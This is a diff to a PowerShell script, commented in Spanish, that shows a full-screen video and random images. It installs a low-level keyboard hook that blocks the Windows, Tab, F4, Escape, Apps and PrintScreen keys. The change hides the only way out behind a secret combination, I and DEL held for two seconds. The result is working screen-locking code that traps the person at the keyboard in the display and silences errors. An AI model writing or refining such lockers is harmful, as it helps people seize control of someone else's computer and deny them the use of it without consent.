@@ -1,6 +1,6 @@
 <#
   run.ps1 - Principal: video | Secundarias: imagen al azar
-  Edge prioritario | Única salida: ESC + DEL
+  Salida: I + DEL mantenidos 2 segundos
 #>
 
 $ErrorActionPreference = 'SilentlyContinue'
@@ -27,13 +27,12 @@ foreach ($url in $imagenesUrl) {
   } catch {}
 }
 
-# Elegir UNA imagen al azar
 $imagenElegida = $null
 if ($imagenesLocales.Count -gt 0) {
   $imagenElegida = $imagenesLocales | Get-Random
 }
 
-# ---------------- Bloqueo de teclas + ESC+DEL ----------------
+# ---------------- Bloqueo de teclas + I+DEL 2 segundos ----------------
 Add-Type -TypeDefinition @'
 using System;
 using System.Diagnostics;
@@ -42,12 +41,16 @@ using System.Runtime.InteropServices;
 public static class KeyBlocker {
   private const int WH_KEYBOARD_LL = 13;
   private const int WM_KEYDOWN = 0x0100;
+  private const int WM_KEYUP = 0x0101;
   private const int WM_SYSKEYDOWN = 0x0104;
+  private const int WM_SYSKEYUP = 0x0105;
+
   private static LowLevelKeyboardProc _proc = HookCallback;
   private static IntPtr _hookID = IntPtr.Zero;
 
-  public static long lastEsc = 0;
-  public static long lastDel = 0;
+  public static bool iDown = false;
+  public static bool delDown = false;
+  public static long bothSince = 0;
   public static bool shouldExit = false;
 
   public static void Start() { _hookID = SetHook(_proc); }
@@ -63,14 +66,41 @@ public static class KeyBlocker {
   private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
 
   private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
-    if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN)) {
+    if (nCode >= 0) {
       int vk = Marshal.ReadInt32(lParam);
       long now = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds();
+      bool isDown = (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN);
+      bool isUp   = (wParam == (IntPtr)WM_KEYUP   || wParam == (IntPtr)WM_SYSKEYUP);
 
-      if (vk == 0x1B) { lastEsc = now; if (now - lastDel < 700) shouldExit = true; }
-      if (vk == 0x2E) { lastDel = now; if (now - lastEsc < 700) shouldExit = true; }
+      // I = 0x49, DEL = 0x2E
+      if (vk == 0x49) {
+        if (isDown) {
+          iDown = true;
+          if (delDown && bothSince == 0) bothSince = now;
+        }
+        if (isUp) {
+          iDown = false;
+          bothSince = 0;
+        }
+      }
+      if (vk == 0x2E) {
+        if (isDown) {
+          delDown = true;
+          if (iDown && bothSince == 0) bothSince = now;
+        }
+        if (isUp) {
+          delDown = false;
+          bothSince = 0;
+        }
+      }
 
-      if (vk == 0x5B || vk == 0x5C || vk == 0x73 || vk == 0x09 || vk == 0x5D || vk == 0x2C) {
+      // Si ambas llevan 2 segundos pulsadas → salir
+      if (iDown && delDown && bothSince > 0 && (now - bothSince) >= 2000) {
+        shouldExit = true;
+      }
+
+      // Bloquear teclas peligrosas (NO bloqueamos I ni DEL)
+      if (isDown && (vk == 0x5B || vk == 0x5C || vk == 0x73 || vk == 0x09 || vk == 0x5D || vk == 0x2C || vk == 0x1B)) {
         return (IntPtr)1;
       }
     }
@@ -177,14 +207,12 @@ function CrearPantallasImagen {
 
 # ---------------- Navegador (Edge prioritario) ----------------
 function Get-Nav {
-  # 1. Edge primero
   $edge = @(
     "$env:ProgramFiles\Microsoft\Edge\Application\msedge.exe",
     "${env:ProgramFiles(x86)}\Microsoft\Edge\Application\msedge.exe"
   )
   foreach ($p in $edge) { if (Test-Path $p) { return $p } }
 
-  # 2. Chrome por si acaso
   $chrome = @(
     "$env:ProgramFiles\Google\Chrome\Application\chrome.exe",
     "${env:ProgramFiles(x86)}\Google\Chrome\Application\chrome.exe",
@@ -253,7 +281,7 @@ try {
       Start-Sleep -Milliseconds 800
     }
 
-    Start-Sleep -Milliseconds 150
+    Start-Sleep -Milliseconds 100
   }
 }
 finally {
